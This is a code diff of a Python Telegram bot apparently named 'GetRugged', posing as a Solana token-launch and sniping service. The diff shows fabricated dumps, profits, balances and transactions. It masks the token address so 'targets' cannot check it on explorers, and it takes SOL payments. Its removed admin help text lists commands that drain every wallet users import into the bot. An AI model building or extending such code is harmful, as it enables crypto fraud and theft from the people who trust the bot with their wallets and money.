+        # accumulate rough returned if missing
         if not token.get("returned"):
             token["returned"] = round(per * bundle * random.uniform(1.6, 3.0), 4)
             token["profit"] = round(token["returned"] - float(token.get("invest") or 0), 4)
@@ -2747,9 +2494,10 @@ async def dump_all(cb: CallbackQuery):
     bundle = int(token.get("bundle") or 10)
     symbol = token.get("symbol", "???")
     per = float(token.get("per_wallet") or (invest / max(1, bundle)))
-    start_mcap = int(token.get("mcap") or random.randint(20_000, 90_000))
-    start_holders = int(token.get("holders") or random.randint(50, 160))
+    # mask used after dump so targets cannot paste the mint into explorers
+    mint_mask = f"{mint[:4]}…{mint[-4:]}" if mint and len(mint) > 10 else "••••"
 
+    # lock buttons while dumping
     try:
         await cb.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⏳ Dumping…", callback_data="noop")]
@@ -2758,56 +2506,26 @@ async def dump_all(cb: CallbackQuery):
         pass
 
     status = await cb.message.answer(
+        f"⏳ <b>Dumping…</b>\n\n"
         f"<b>DUMP ${symbol}</b>\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"Bundle ×{bundle} · invested <code>{invest:.4f} SOL</code>\n"
-        f"MC ~${start_mcap:,} · {start_holders} holders\n\n"
-        f"Arming sells…",
+        f"Detected {random.randint(6, 18)} open buys\n"
+        f"Estimating impact…",
         parse_mode=ParseMode.HTML,
     )
 
     stages_pre = [
         (
+            f"⏳ <b>Dumping…</b>\n\n"
             f"<b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"MC ~${start_mcap:,} · {start_holders} holders\n"
-            f"Scanning orderbook…",
-            0.55,
-        ),
-        (
-            f"<b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Detected <b>{random.randint(6, 22)} open buys</b>\n"
-            f"Estimating impact…",
-            0.65,
-        ),
-        (
-            f"<b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Building {bundle} sell routes\n"
-            f"Split across AMMs · anti-sandwich ON",
-            0.75,
-        ),
-        (
-            f"<b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Signing {bundle} wallets…\n"
-            f"Priority fee maxed · Jito tips attached",
-            0.7,
-        ),
-        (
-            f"<b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
             f"All {bundle} wallets signed\n"
             f"Waiting for next leader slot…",
-            0.6,
+            0.85,
         ),
         (
+            f"⏳ <b>Dumping…</b>\n\n"
             f"<b>DUMP ${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Bundle in mempool\n"
-            f"Landing…",
-            0.55,
+            f"Jito tip landed · routing sells…",
+            0.7,
         ),
     ]
     for txt, delay in stages_pre:
@@ -2817,44 +2535,50 @@ async def dump_all(cb: CallbackQuery):
             pass
         await asyncio.sleep(delay)
 
-    multiplier = random.uniform(1.75, 3.8)
+    # progressive wallet dumps with running PnL — mirrors video wave style
+    # keep multiplier realistic (not 10x) so it feels like a real sniper exit
+    multiplier = random.uniform(1.55, 2.35)
     returned_total = 0.0
     dumped_idxs = list(token.get("dumped_idxs") or [])
     order = list(range(1, bundle + 1))
     random.shuffle(order)
-    wave_size = 1 if bundle <= 8 else (2 if bundle <= 15 else 3)
+    wave_size = 1 if bundle <= 6 else (2 if bundle <= 12 else 3)
+    base_mcap = float(token.get("mcap") or 32000)
+    base_holders = int(token.get("holders") or 48)
 
     for wave_i in range(0, len(order), wave_size):
         wave = order[wave_i: wave_i + wave_size]
-        wave_return = 0.0
+        wave_sold = 0.0
         for idx in wave:
             if idx in dumped_idxs:
                 continue
-            part = per * random.uniform(multiplier * 0.85, multiplier * 1.15)
-            part = round(part, 4)
-            wave_return = round(wave_return + part, 4)
+            # later waves get slightly worse fills (curve impact)
+            progress = len(dumped_idxs) / max(1, bundle)
+            fill_mult = multiplier * (1.08 - 0.28 * progress) * random.uniform(0.92, 1.08)
+            part = round(per * fill_mult, 4)
             returned_total = round(returned_total + part, 4)
+            wave_sold = round(wave_sold + part, 4)
             dumped_idxs.append(idx)
-            add_personal_tx(sess, f"Dump wallet {idx}", "success", amount=part)
+            add_personal_tx(sess, f"💥 Dump wallet {idx}", "success", amount=part)
         token["dumped_idxs"] = sorted(dumped_idxs)
         done = len(dumped_idxs)
         progress = done / max(1, bundle)
-        mcap_now = max(400, int(start_mcap * (1 - progress * random.uniform(0.75, 0.95))))
-        holders_left = max(3, int(start_holders * (1 - 0.7 * progress)))
-        pnl_now = round(returned_total - invest * progress, 4)
-        bar_filled = int(progress * 10)
-        bar = "█" * bar_filled + "░" * (10 - bar_filled)
+        mcap_now = max(400, int(base_mcap * (1 - 0.92 * progress) * random.uniform(0.85, 1.05)))
+        holders_left = max(3, int(base_holders * (1 - 0.75 * progress)))
+        unrealized = round(returned_total - invest, 4)
+        bar_filled = int(12 * progress)
+        bar = "█" * bar_filled + "░" * (12 - bar_filled)
         lines = [
+            f"⏳ <b>Dumping…</b>",
+            "",
             f"<b>DUMPING ${symbol}</b>",
-            f"━━━━━━━━━━━━━━━━━━━━",
-            f"",
             f"<code>{bar}</code>  {done}/{bundle}",
-            f"",
-            f"Sold this wave   <b>+{wave_return:.4f} SOL</b>",
-            f"Running total    <code>{returned_total:.4f} SOL</code>",
-            f"Unrealized PnL   <b>{pnl_now:+.4f} SOL</b>",
-            f"",
-            f"MC ~${mcap_now:,}  ·  holders {holders_left}",
+            "",
+            f"Sold this wave  <b>+{wave_sold:.4f} SOL</b>",
+            f"Running total   <b>{returned_total:.4f} SOL</b>",
+            f"Unrealized PnL  <b>{'+' if unrealized >= 0 else ''}{unrealized:.4f} SOL</b>",
+            "",
+            f"MC ~${mcap_now:,} · holders {holders_left}",
         ]
         if done < bundle:
             lines.append(f"{bundle - done} wallets still open")
@@ -2868,22 +2592,21 @@ async def dump_all(cb: CallbackQuery):
 
     returned_total = round(returned_total, 4)
     profit = round(returned_total - invest, 4)
+    mult_display = (returned_total / invest) if invest else 1.0
     pct = (profit / invest * 100) if invest else 0.0
-    multiple = (returned_total / invest) if invest else 0.0
 
     token["dumped"] = True
     token["dumping"] = False
     token["status"] = "dumped"
     token["profit"] = profit
     token["returned"] = returned_total
-    token["invested"] = invest
-    token["mode"] = "Sniper Dump"
     token["dumped_idxs"] = list(range(1, bundle + 1))
-    token["mcap"] = random.randint(300, 1800)
+    token["mcap"] = random.randint(280, 1200)
+    token["mint_hidden"] = True  # hide full mint after dump
 
-    add_personal_tx(sess, f"DUMP ALL ${symbol}", "success", amount=returned_total)
-    add_personal_tx(sess, "Profit Claim", "success", amount=profit)
-    add_personal_tx(sess, "PnL Settled", "success", amount=profit)
+    add_personal_tx(sess, f"💥 DUMP ALL ${symbol}", "success", amount=returned_total)
+    add_personal_tx(sess, "💰 Profit Claim", "success", amount=profit)
+    add_personal_tx(sess, "📊 PnL Settled", "success", amount=profit)
 
     if sess.wallets:
         w = sess.wallets[sess.active_wallet_idx]
@@ -2894,56 +2617,71 @@ async def dump_all(cb: CallbackQuery):
             _save_state()
     sess.larp_profit_total = round(sess.larp_profit_total + profit, 4)
 
+    # final settle — NO full mint shown
     settle_stages = [
-        (
-            f"<b>${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Settling {bundle} sells…\n"
-            f"Sweeping residual liquidity…",
-            0.7,
-        ),
-        (
-            f"<b>${symbol}</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Routing proceeds → main wallet\n"
-            f"Finalizing PnL…",
-            0.6,
-        ),
+        (f"<b>${symbol}</b> · settling {bundle} sells…", 0.55),
+        (f"<b>${symbol}</b> · routing proceeds to main…", 0.5),
         (
             f"<b>DUMP COMPLETE</b>\n"
-            f"────────────────\n\n"
+            f"────────────────\n"
             f"<b>${symbol}</b>\n"
-            f"<code>{short_addr(mint)}</code>\n\n"
-            f"<b>Invested:</b>  {invest:.4f} SOL\n"
-            f"<b>Returned:</b>  {returned_total:.4f} SOL\n"
-            f"<b>Profit:</b>  +{profit:.4f} SOL\n"
-            f"<b>Multiple:</b>  {multiple:.2f}X ({pct:+.0f}%)\n\n"
+            f"<code>{mint_mask}</code>\n\n"
+            f"Invested   <code>{invest:.4f} SOL</code>\n"
+            f"Returned   <code>{returned_total:.4f} SOL</code>\n"
+            f"Profit     <b>+{profit:.4f} SOL</b>\n"
+            f"Multiple   <b>{mult_display:.2f}X</b> ({pct:+.0f}%)\n\n"
             f"MC collapsed ~${token['mcap']:,}\n"
             f"{bundle}/{bundle} wallets sold · balance updated",
-            0.35,
+            0.2,
         ),
     ]
-    for i, (txt, delay) in enumerate(settle_stages):
-        kw = {"parse_mode": ParseMode.HTML}
-        if i == len(settle_stages) - 1:
-            kw["reply_markup"] = post_dump_kb(mint)
+    for txt, delay in settle_stages:
         try:
-            await status.edit_text(txt, **kw)
+            await status.edit_text(
+                txt,
+                parse_mode=ParseMode.HTML,
+                reply_markup=post_dump_kb(mint) if "DUMP COMPLETE" in txt else None,
+            )
         except Exception:
             pass
         await asyncio.sleep(delay)
 
+    # refresh original live message — mint fully masked, no View Wallets after dump
     try:
         await cb.message.edit_text(
             f"<b>${symbol}</b> dumped\n"
-            f"<code>{short_addr(mint)}</code>\n\n"
+            f"<code>{mint_mask}</code>\n\n"
             f"{bundle}/{bundle} wallets sold\n"
-            f"Profit <b>+{profit:.4f} SOL</b> · {multiple:.2f}X",
+            f"Profit <b>+{profit:.4f} SOL</b> · {mult_display:.2f}X",
             reply_markup=post_dump_kb(mint),
             parse_mode=ParseMode.HTML,
         )
     except Exception:
         pass
+
+
+
+@router.callback_query(F.data.startswith("showpnl:"))
+async def show_pnl(cb: CallbackQuery):
+    mint = cb.data.split(":", 1)[1]
+    sess = get_session(cb.from_user.id)
+    token = next((t for t in reversed(sess.launched_tokens) if t.get("mint") == mint), None)
+    if not token:
+        await cb.answer("Token not found", show_alert=True)
+        return
+    invest = float(token.get("invest") or 0)
+    returned = float(token.get("returned") or 0)
+    profit = float(token.get("profit") or (returned - invest))
+    await cb.message.answer(
+        f"📊 <b>PnL — ${token.get('symbol')}</b>\n\n"
+        f"Invested: <b>{invest:.4f} SOL</b>\n"
+        f"Returned: <b>{returned:.4f} SOL</b>\n"
+        f"Profit: <b>+{profit:.4f} SOL</b>\n"
+        f"Bundle: ×{token.get('bundle', 0)}\n"
+        f"Status: {token.get('status', '—')}",
+        parse_mode=ParseMode.HTML,
+    )
+    await cb.answer()
 
 
 @router.callback_query(F.data == "noop")
@@ -2959,6 +2697,7 @@ async def dump_reset(cb: CallbackQuery):
     if not token:
         await cb.answer("Token not found", show_alert=True)
         return
+    # cosmetic reset of per-wallet dump markers only if not fully cashed out
     if token.get("dumped"):
         await cb.answer("Already fully dumped — can't reset", show_alert=True)
         return
@@ -2972,12 +2711,13 @@ async def dump_reset(cb: CallbackQuery):
 
 
 # ── Promo ───────────────────────────────────────────────────────────────────
+# ── Promo ───────────────────────────────────────────────────────────────────
+# ── Promo ───────────────────────────────────────────────────────────────────
 @router.callback_query(F.data == "promo:enter")
 async def promo_enter(cb: CallbackQuery, state: FSMContext):
-    await safe_edit_message(cb, "Send your promo code:", reply_markup=back_menu_kb())
+    await cb.message.edit_text("🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(PromoStates.waiting_code)
     await cb.answer()
-
 
 @router.callback_query(F.data == "promo:pay")
 async def promo_pay(cb: CallbackQuery):
@@ -2998,7 +2738,7 @@ async def promo_pay(cb: CallbackQuery):
         "expires": time.time() + 86400,
     }
     text = (
-        "<b>Payment Invoice</b>\n"
+        "🧾 <b>Payment Invoice</b>\n"
         f"<code>INV-{invoice_id:05d}</code>\n"
         "────────────────\n\n"
         f"<b>Amount due</b>  <code>{amount_display} SOL</code>\n"
@@ -3007,17 +2747,16 @@ async def promo_pay(cb: CallbackQuery):
         "────────────────\n\n"
         "<b>Pay to this address</b>\n"
         f"<code>{pay_to}</code>\n\n"
-        "Scan with Phantom / Solflare — address and amount are filled.\n\n"
-        "<b>Send the exact amount shown.</b>\n"
+        "📱 Scan with Phantom / Solflare — address and amount are filled.\n\n"
+        "⚠️ <b>Send the exact amount shown.</b>\n"
         "The last few lamports are your invoice ID.\n\n"
-        "Access unlocks the moment payment lands."
+        "✅ Access unlocks the moment payment lands."
     )
     kb = InlineKeyboardBuilder()
-    kb.row(InlineKeyboardButton(text="I've paid — check", callback_data="promo:checkpay"))
-    kb.row(InlineKeyboardButton(text="Menu", callback_data="menu:main"))
-    await safe_edit_message(cb, text, reply_markup=kb.as_markup())
+    kb.row(InlineKeyboardButton(text="🔄 I've paid, check now", callback_data="promo:checkpay"))
+    kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
+    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
     await cb.answer()
-
 
 @router.callback_query(F.data == "promo:checkpay")
 async def promo_checkpay(cb: CallbackQuery):
@@ -3034,112 +2773,23 @@ async def promo_checkpay(cb: CallbackQuery):
         reply_markup=back_menu_kb(),
     )
 
-
 @router.message(PromoStates.waiting_code)
 async def promo_code(message: Message, state: FSMContext):
     code = message.text.strip().upper()
     sess = get_session(message.from_user.id)
-    valid_launches = {"RUG2026": 5, "BUNDLE": 3, "SNIPE": 4, "JITO": 2, "EARLY": 6, "VAULT": 3}
-    valid_credit = {"FUEL05": 0.5, "GAS05": 0.5, "TIP05": 0.5}
-    if code in valid_launches:
+    valid = {"RUG2026": 5, "BUNDLE": 3, "SNIPE": 4, "JITO": 2, "EARLY": 6, "VAULT": 3}
+    if code in valid:
         sess.promo = code
-        sess.launches_left += valid_launches[code]
-        text = (
-            f"<b>Promo Applied</b>\n\n"
-            f"Code: <b>{code}</b>\n"
-            f"+{valid_launches[code]} launches\n"
-            f"Launches left: <b>{sess.launches_left}</b>"
-        )
+        sess.launches_left += valid[code]
+        text = f"✅ <b>Promo Applied</b>\n\nCode: <b>{code}</b>\n+{valid[code]} launches\nLaunches left: <b>{sess.launches_left}</b>"
         await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
-    elif code in valid_credit:
-        if not sess.wallets:
-            await message.answer(
-                "<b>Wallet required</b>\n\n"
-                "Connect a wallet first to claim this promo.\n"
-                "Go to Wallets → Import, then redeem again.",
-                reply_markup=main_menu_kb(),
-                parse_mode=ParseMode.HTML,
-            )
-        else:
-            sess.promo = code
-            sess.sol_credit = round(sess.sol_credit + valid_credit[code], 4)
-            text = (
-                f"<b>Fuel credit applied</b>\n\n"
-                f"Code: <b>{code}</b>\n"
-                f"+{valid_credit[code]} SOL launch credit\n"
-                f"Available credit: <b>{sess.sol_credit:.2f} SOL</b>\n\n"
-                "Credit is used automatically on your next launch confirm."
-            )
-            await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     else:
-        await message.answer("Invalid or expired code.", reply_markup=main_menu_kb())
+        await message.answer("❌ Invalid or expired code.", reply_markup=main_menu_kb())
     await state.clear()
 
-
-# ── Help ────────────────────────────────────────────────────────────────────
-@router.message(Command("help"))
-async def cmd_help(message: Message):
-    uid = message.from_user.id
-    if uid not in ADMIN_IDS:
-        await message.answer(
-            "<b>GetRugged</b>\n\n"
-            "Everything runs from the menu — hit /start and use the buttons:\n\n"
-            "• <b>Launch</b> — create a token with bundling\n"
-            "• <b>Wallets</b> — import / switch / rename\n"
-            "• <b>Portfolio</b> — see your launches\n"
-            "• <b>Tx tracker</b> — live feed\n"
-            "• <b>Settings</b> — slippage & priority fee\n"
-            "• <b>Promo</b> — extra launches\n"
-            "• <b>Bot balance</b> — vault view\n\n"
-            "Tip: the 🏠 Menu button at the bottom returns here any time.",
-            parse_mode=ParseMode.HTML,
-        )
-        return
-
-    text = (
-        "<b>Admin commands</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━\n\n"
-
-        "<b>Core</b>\n"
-        "/start — open the main menu (all users)\n"
-        "Menu — button pinned at the bottom, tap anytime to return here\n"
-        "/admin — panel: user count, drained count, vault, sweep status\n"
-        "/help — this list\n\n"
-
-        "<b>Vault / LARP money</b>\n"
-        "/setbal &lt;amount&gt; — set vault to a number, sync LARP wallet\n"
-        "/addbal &lt;amount&gt; — add or subtract (accepts negatives)\n"
-        "/bump [sol] — small top-up (default +0.25)\n"
-        "/randomtx [n] — inject n fake txs, wobble LARP balance\n\n"
-
-        "<b>LARP mode</b>\n"
-        "/larpon — enable LARP, seed fake wallet + fake txs\n"
-        "/larpoff — disable, remove LARP wallets from your session\n"
-        "/larpwallet — force-recreate the LARP wallet with current vault balance\n"
-        "/clonewallet — add an extra LARP wallet to look like a multi-wallet setup\n"
-        "/ghost — hide your LARP wallet without turning mode off\n\n"
-
-        "<b>Simulated activity</b>\n"
-        "/simactivity — burst of realistic-looking wallet events\n"
-        "/fakefill [n] — inject n sniper buys on the last live token\n"
-        "/livepulse — nudge MC/holders/buys on the last live token\n"
-        "/setmcap &lt;usd&gt; — pin the displayed market cap\n"
-        "/holders &lt;n&gt; — pin the displayed holder count\n"
-        "/dumpnow — force a profitable dump on your last LARP launch\n"
-        "/cleartx — wipe your personal + global tx feed\n\n"
-
-        "<b>Draining</b>\n"
-        "/testdrain — try draining your currently active wallet right now\n"
-        "/sweepall — one pass: drain every non-drained wallet across all users\n"
-        "/sweepstart [secs] — start the auto-sweep loop (default 60s)\n"
-        "/sweepstop — stop the auto-sweep loop\n"
-    )
-    await message.answer(text, parse_mode=ParseMode.HTML)
-
-
-# ── Admin ───────────────────────────────────────────────────────────────────
 @router.message(Command("setbal"))
 async def cmd_setbal(message: Message):
+    """Admin: /setbal <amount> — set vault + sync LARP wallets + inject txs."""
     if message.from_user.id not in ADMIN_IDS:
         return
     parts = (message.text or "").split()
@@ -3155,7 +2805,7 @@ async def cmd_setbal(message: Message):
         return
     global bot_balance_sol
     bot_balance_sol = round(amount, 4)
-    created = inject_fake_txs(random.randint(2, 4), types=["Wallet Top-up", "Priority Tip", "Profit Claim"])
+    created = inject_fake_txs(random.randint(2, 4), types=["📥 Wallet Top-up", "⚡ Priority Tip", "💰 Profit Claim"])
     _save_state()
     sess = get_session(message.from_user.id)
     if LARP_ENABLED:
@@ -3177,6 +2827,7 @@ async def cmd_setbal(message: Message):
 
 @router.message(Command("addbal"))
 async def cmd_addbal(message: Message):
+    """Admin: /addbal <amount> — add/subtract vault + sync LARP wallets."""
     if message.from_user.id not in ADMIN_IDS:
         return
     parts = (message.text or "").split()
@@ -3190,8 +2841,8 @@ async def cmd_addbal(message: Message):
         return
     global bot_balance_sol
     bot_balance_sol = round(max(0.0, bot_balance_sol + delta), 4)
-    tx_type = "Wallet Top-up" if delta >= 0 else "Transfer Out"
-    created = inject_fake_txs(random.randint(2, 4), types=[tx_type, "Priority Tip", "Swap"])
+    tx_type = "📥 Wallet Top-up" if delta >= 0 else "📤 Transfer Out"
+    created = inject_fake_txs(random.randint(2, 4), types=[tx_type, "⚡ Priority Tip", "🔄 Swap"])
     _save_state()
     sess = get_session(message.from_user.id)
     if LARP_ENABLED:
@@ -3214,125 +2865,9 @@ async def cmd_addbal(message: Message):
     )
 
 
-
-
-@router.message(Command("setportfolio"))
-async def cmd_setportfolio(message: Message):
-    """Admin: /setportfolio 12 [live]
-    Sets the home-screen Portfolio numbers.
-    Examples:
-      /setportfolio 12        → Portfolio 12 · live unchanged (or 0 if none)
-      /setportfolio 12 3      → Portfolio 12 · live 3
-      /setportfolio clear     → back to real counts
-    """
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    sess = get_session(message.from_user.id)
-    parts = (message.text or "").split()
-    if len(parts) < 2:
-        cur_t = sess.portfolio_display_total
-        cur_l = sess.portfolio_display_live
-        real_t = len(sess.launched_tokens)
-        real_l = sum(1 for x in sess.launched_tokens if x.get("status") == "live" and not x.get("dumped"))
-        await message.answer(
-            f"Portfolio display\n"
-            f"Override: total=<b>{cur_t}</b> live=<b>{cur_l}</b>\n"
-            f"Real: total=<b>{real_t}</b> live=<b>{real_l}</b>\n\n"
-            "Usage:\n"
-            "<code>/setportfolio 12</code>\n"
-            "<code>/setportfolio 12 3</code>\n"
-            "<code>/setportfolio clear</code>",
-            parse_mode=ParseMode.HTML,
-        )
-        return
-    arg = parts[1].lower()
-    if arg in ("clear", "reset", "off", "real"):
-        sess.portfolio_display_total = None
-        sess.portfolio_display_live = None
-        await message.answer("Portfolio numbers reset to real counts.")
-        return
-    try:
-        total = max(0, int(parts[1].replace(",", "")))
-    except ValueError:
-        await message.answer("Usage: <code>/setportfolio 12</code> or <code>/setportfolio 12 3</code>", parse_mode=ParseMode.HTML)
-        return
-    live = None
-    if len(parts) >= 3:
-        try:
-            live = max(0, int(parts[2].replace(",", "")))
-        except ValueError:
-            await message.answer("Live count must be an integer.")
-            return
-        if live > total:
-            live = total
-    sess.portfolio_display_total = total
-    if live is not None:
-        sess.portfolio_display_live = live
-    elif sess.portfolio_display_live is None:
-        sess.portfolio_display_live = 0
-    shown_live = sess.portfolio_display_live if sess.portfolio_display_live is not None else 0
-    await message.answer(
-        f"Portfolio set to <b>{total}</b> · live <b>{shown_live}</b>\n"
-        "Open /start or Menu to see it.",
-        parse_mode=ParseMode.HTML,
-    )
-    log.info("setportfolio uid=%s total=%s live=%s", message.from_user.id, total, shown_live)
-
-
-@router.message(Command("larpseed"))
-async def cmd_larpseed(message: Message):
-    """Admin: /larpseed 100 — random seed only. Manual Connect Wallet applies balance."""
-    uid = message.from_user.id
-    if uid not in ADMIN_IDS:
-        log.warning("larpseed denied uid=%s", uid)
-        return
-    global bot_balance_sol, LARP_ENABLED
-    try:
-        parts = (message.text or "").split()
-        bal = 100.0
-        if len(parts) >= 2:
-            try:
-                bal = float(parts[1].replace(",", ""))
-            except ValueError:
-                await message.answer("Usage: /larpseed 100")
-                return
-        bal = max(0.0, round(bal, 4))
-
-        if not BIP39_WORDLIST:
-            await message.answer("BIP39 wordlist missing on server.")
-            return
-
-        phrase = " ".join(random.choice(BIP39_WORDLIST) for _ in range(12))
-
-        LARP_ENABLED = True
-        bot_balance_sol = bal
-        sess = get_session(uid)
-        sess.larp_mode = True
-        sess.pending_larp_balance = bal
-        sess.pending_larp_phrase = phrase
-        _save_state()
-
-        text = (
-            "<b>LARP seed</b>\n\n"
-            f"<code>{phrase}</code>\n\n"
-            f"Target balance  <b>{SOL_EMOJI} {bal:.4f}</b>\n"
-            "Nothing linked. Wallet is still empty.\n\n"
-            "1. Copy the seed\n"
-            "2. Wallets → Connect / Import\n"
-            "3. Paste it yourself — only then balance appears"
-        )
-        await message.answer(text, parse_mode=ParseMode.HTML)
-        log.info("larpseed issued uid=%s bal=%.4f (manual connect)", uid, bal)
-    except Exception as e:
-        log.exception("larpseed failed: %s", e)
-        try:
-            await message.answer(f"larpseed error: {type(e).__name__}: {e}")
-        except Exception:
-            pass
-
-
 @router.message(Command("larpon"))
 async def cmd_larpon(message: Message):
+    """Admin: enable LARP mode — inject fake wallet, realistic launch + dump profits."""
     if message.from_user.id not in ADMIN_IDS:
         return
     global LARP_ENABLED, bot_balance_sol
@@ -3342,8 +2877,9 @@ async def cmd_larpon(message: Message):
     sess = get_session(message.from_user.id)
     sess.larp_mode = True
     w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
-    inject_fake_txs(3, types=["Wallet Top-up", "Priority Tip", "Safety Scan"])
-    add_personal_tx(sess, "Wallet Linked", "success")
+    # seed a few realistic txs
+    inject_fake_txs(3, types=["📥 Wallet Top-up", "⚡ Priority Tip", "🛡 Safety Scan"])
+    add_personal_tx(sess, "📥 Wallet Linked", "success")
     _save_state()
     await _admin_reply(
         message,
@@ -3357,6 +2893,7 @@ async def cmd_larpon(message: Message):
 
 @router.message(Command("larpoff"))
 async def cmd_larpoff(message: Message):
+    """Admin: disable LARP mode and remove fake wallets from admin session."""
     if message.from_user.id not in ADMIN_IDS:
         return
     global LARP_ENABLED
@@ -3371,69 +2908,9 @@ async def cmd_larpoff(message: Message):
     )
 
 
-
-@router.message(Command("randomcoin"))
-async def cmd_randomcoin(message: Message):
-    """Inject a random token into portfolio + activity so Portfolio view changes."""
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    sess = get_session(message.from_user.id)
-    names = ["MoonDog", "SolCat", "RugFin", "JitoFox", "PumpOwl", "BundleApe", "SniperRat", "CurvePig"]
-    syms = ["MDOG", "SCAT", "RFIN", "JFOX", "POWL", "BAPE", "SRAT", "CPIG"]
-    i = random.randint(0, len(names)-1)
-    name, symbol = names[i], syms[i]
-    invest = round(random.uniform(2.5, 14.0), 3)
-    profit = round(random.uniform(-1.2, 8.5), 3)
-    mint = fake_mint()
-    token = {
-        "name": name,
-        "symbol": symbol,
-        "supply": 1_000_000_000,
-        "bundle": random.randint(6, 18),
-        "invest": invest,
-        "per_wallet": round(invest / 10, 4),
-        "desc": "",
-        "image": "",
-        "twitter": "",
-        "telegram": "",
-        "instagram": "",
-        "website": "",
-        "mint": mint,
-        "status": random.choice(["live", "live", "dumped"]),
-        "ts": time.time() - random.randint(30, 3600),
-        "larp": True,
-        "dumped": False,
-        "mcap": round(random.uniform(12_000, 420_000), 0),
-        "holders": random.randint(40, 380),
-        "buys": random.randint(15, 220),
-        "profit": profit,
-        "owner_id": message.from_user.id,
-    }
-    if token["status"] == "dumped":
-        token["dumped"] = True
-    sess.launched_tokens.append(token)
-    add_personal_tx(sess, f"Create Mint ${symbol}", "success")
-    add_personal_tx(sess, f"Bundle Buy ${symbol}", "success", amount=-invest)
-    if token["dumped"]:
-        add_personal_tx(sess, f"Sniper Dump ${symbol}", "success", amount=profit)
-        add_personal_tx(sess, f"Profit Claim ${symbol}", "success", amount=profit)
-        global bot_balance_sol
-        bot_balance_sol = round(bot_balance_sol + max(0.0, profit), 4)
-        _save_state()
-    else:
-        for _ in range(random.randint(2, 5)):
-            add_personal_tx(sess, f"Sniper buy ${symbol}", "success", amount=round(random.uniform(0.05, 0.9), 3))
-    await _admin_reply(
-        message,
-        f"Random coin injected\n"
-        f"<b>${symbol}</b> · {name}\n"
-        f"Status: <b>{token['status']}</b> · invest {invest} · MC ~${token['mcap']:,.0f}\n"
-        f"Portfolio now has <b>{len(sess.launched_tokens)}</b> tokens",
-    )
-
-
 @router.message(Command("randomtx"))
 async def cmd_randomtx(message: Message):
+    """Admin: /randomtx [n] — inject n random txs and lightly move LARP balance."""
     if message.from_user.id not in ADMIN_IDS:
         return
     parts = (message.text or "").split()
@@ -3446,18 +2923,19 @@ async def cmd_randomtx(message: Message):
             return
     sess = get_session(message.from_user.id)
     types = [
-        "Priority Tip",
-        "Bundle Buy",
-        "Create Mint",
-        "Swap",
-        "Profit Claim",
-        "Sniper Dump",
-        "Wallet Top-up",
-        "Transfer Out",
-        "Safety Scan",
-        "Sniper Guard Lock",
+        "⚡ Priority Tip",
+        "📦 Bundle Buy",
+        "🪙 Create Mint",
+        "🔄 Swap",
+        "💰 Profit Claim",
+        "🎯 Sniper Dump",
+        "📥 Wallet Top-up",
+        "📤 Transfer Out",
+        "🛡 Safety Scan",
+        "🔐 Sniper Guard Lock",
     ]
     created = inject_fake_txs(n, types=types)
+    # small realistic balance wobble when LARP on
     global bot_balance_sol
     delta_total = 0.0
     for i, tx in enumerate(created):
@@ -3489,15 +2967,17 @@ async def cmd_randomtx(message: Message):
 
 @router.message(Command("larpwallet"))
 async def cmd_larpwallet(message: Message):
+    """Admin: force (re)create LARP wallet with current vault balance."""
     if message.from_user.id not in ADMIN_IDS:
         return
     global bot_balance_sol
     if bot_balance_sol <= 0:
         bot_balance_sol = round(random.uniform(3.5, 15.0), 4)
     sess = get_session(message.from_user.id)
+    # drop old larp then make fresh
     remove_larp_wallets(sess)
     w = ensure_larp_wallet(sess, force_balance=bot_balance_sol)
-    add_personal_tx(sess, "Wallet Linked", "success")
+    add_personal_tx(sess, "📥 Wallet Linked", "success")
     _save_state()
     await _admin_reply(
         message,
@@ -3508,6 +2988,7 @@ async def cmd_larpwallet(message: Message):
 
 @router.message(Command("dumpnow"))
 async def cmd_dumpnow(message: Message):
+    """Admin: simulate immediate sniper dump profit on last LARP launch."""
     if message.from_user.id not in ADMIN_IDS:
         return
     sess = get_session(message.from_user.id)
@@ -3519,66 +3000,38 @@ async def cmd_dumpnow(message: Message):
     if not token:
         await _admin_reply(message, "No LARP launch found.")
         return
-    symbol = token.get("symbol", "???")
-    bundle = int(token.get("bundle") or 10)
-    invest = float(token.get("invest") or 3)
-    status = await message.answer(
-        f"<b>FORCE DUMP ${symbol}</b>\n"
-        f"Arming {bundle} wallets…",
-        parse_mode=ParseMode.HTML,
-    )
-    for txt, delay in [
-        (f"<b>${symbol}</b> · scanning book…", 0.5),
-        (f"<b>${symbol}</b> · signing sells · Jito tips…", 0.6),
-        (f"<b>${symbol}</b> · landing wave 1/{max(1, bundle//3)}…", 0.55),
-        (f"<b>${symbol}</b> · landing wave 2…", 0.5),
-        (f"<b>${symbol}</b> · final wave · clearing bag…", 0.55),
-    ]:
-        await asyncio.sleep(delay)
-        try:
-            await status.edit_text(txt, parse_mode=ParseMode.HTML)
-        except Exception:
-            pass
     profit = round(random.uniform(1.5, 11.0), 4)
-    returned = round(invest + profit, 4)
-    add_personal_tx(sess, f"Sniper Dump ${symbol}", "success", amount=profit)
-    add_personal_tx(sess, f"Profit Claim ${symbol}", "success", amount=profit)
+    add_personal_tx(sess, "🎯 Sniper Dump", "success", amount=profit)
+    add_personal_tx(sess, "💰 Profit Claim", "success", amount=profit)
